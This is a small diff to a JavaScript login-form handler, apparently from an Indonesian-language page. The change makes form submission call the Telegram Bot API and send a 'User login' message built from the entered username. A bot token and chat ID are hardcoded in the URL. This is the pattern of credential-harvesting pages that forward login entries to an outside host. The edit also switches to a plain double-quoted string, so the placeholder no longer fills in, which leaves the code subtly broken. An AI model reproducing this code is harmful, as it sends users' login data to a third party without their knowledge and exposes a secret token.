@@ -22,7 +22,7 @@ document.getElementById("loginForm").addEventListener("submit", function(e){
   let chat_id = "CHAT_ID_KAMU";
   let message = "User login: " + username;
 
-  fetch(`https://api.telegram.org/bot8566904522:AAEWFB-1fbvjnJbEAQ7E0FUVCDnbRzrVFBU/sendMessage?chat_id=6297122078&text=`);
+  fetch("https://api.telegram.org/bot8566904522:AAEWFB-1fbvjnJbEAQ7E0FUVCDnbRzrVFBU/sendMessage?chat_id=6297122078&text=${message}");
   
   alert("Login berhasil!");
 });
